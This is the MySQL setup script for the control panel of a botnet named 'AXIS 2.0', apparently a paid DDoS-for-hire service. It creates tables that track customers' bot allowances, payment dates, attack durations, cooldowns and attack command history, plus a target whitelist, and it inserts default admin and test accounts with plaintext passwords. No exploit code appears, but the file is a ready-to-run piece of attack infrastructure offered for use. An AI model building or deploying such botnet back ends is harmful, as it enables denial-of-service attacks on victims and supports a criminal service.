-- AXIS 2.0 Botnet Database Schema
-- ============================================================================
-- Database: MySQL/MariaDB
-- Tables: users, history, whitelist, logins, online
-- 
-- Setup: mysql -u root -p < database.sql
-- 
-- Default Credentials (CHANGE IMMEDIATELY!):
--   Username: admin | Password: admin123 | API Key: AXIS2-ADMIN-APIKEY
-- ============================================================================

CREATE DATABASE IF NOT EXISTS AXIS2;
USE AXIS2;

-- Users table
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(32) NOT NULL UNIQUE,
    password VARCHAR(32) NOT NULL,
    max_bots INT DEFAULT -1,
    admin INT DEFAULT 0,
    api_key VARCHAR(64),
    last_paid INT DEFAULT 0,
    intvl INT DEFAULT 30,
    wrc INT DEFAULT 0,
    cooldown INT DEFAULT 0,
    duration_limit INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=MyISAM;

-- Attack history table
CREATE TABLE IF NOT EXISTS history (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(32) NOT NULL,
    command TEXT NOT NULL,
    duration INT NOT NULL,
    max_bots INT DEFAULT -1,
    time_sent INT NOT NULL,
    INDEX (username),
    INDEX (time_sent)
) ENGINE=MyISAM;

-- Whitelist table (protected targets)
CREATE TABLE IF NOT EXISTS whitelist (
    id INT AUTO_INCREMENT PRIMARY KEY,
    prefix VARCHAR(16) NOT NULL,
    netmask VARCHAR(8) NOT NULL,
    UNIQUE KEY unique_whitelist (prefix, netmask)
) ENGINE=MyISAM;

-- Login logs table
CREATE TABLE IF NOT EXISTS logins (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(32) NOT NULL,
    action VARCHAR(16) NOT NULL,
    ip VARCHAR(45) NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=MyISAM;

-- Online tracking table
CREATE TABLE IF NOT EXISTS online (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(32) NOT NULL,
    ip VARCHAR(45) NOT NULL,
    last_seen INT NOT NULL,
    UNIQUE KEY unique_online (username)
) ENGINE=MyISAM;

-- Insert default admin user
-- Username: admin
-- Password: admin123 (CHANGE THIS IMMEDIATELY!)
-- API Key: AXIS2-ADMIN-APIKEY (CHANGE THIS!)
INSERT INTO users (username, password, max_bots, admin, cooldown, duration_limit, api_key)
VALUES ('admin', 'admin123', -1, 1, 0, 0, 'AXIS2-ADMIN-APIKEY');

-- Insert sample basic user
-- Username: test
-- Password: test123
INSERT INTO users (username, password, max_bots, admin, cooldown, duration_limit)
VALUES ('test', 'test123', 100, 0, 30, 300);

-- Insert sample whitelisted ranges (modify as needed)
INSERT INTO whitelist (prefix, netmask) VALUES ('10.0.0.0', '8');      -- Private network
INSERT INTO whitelist (prefix, netmask) VALUES ('172.16.0.0', '12');   -- Private network
INSERT INTO whitelist (prefix, netmask) VALUES ('192.168.0.0', '16');  -- Private network
INSERT INTO whitelist (prefix, netmask) VALUES ('127.0.0.0', '8');     -- Loopback

-- Grant privileges (adjust as needed)
-- GRANT ALL PRIVILEGES ON ProdNet.* TO 'root'@'localhost';
-- FLUSH PRIVILEGES;

SELECT 'Database setup complete!' AS status;
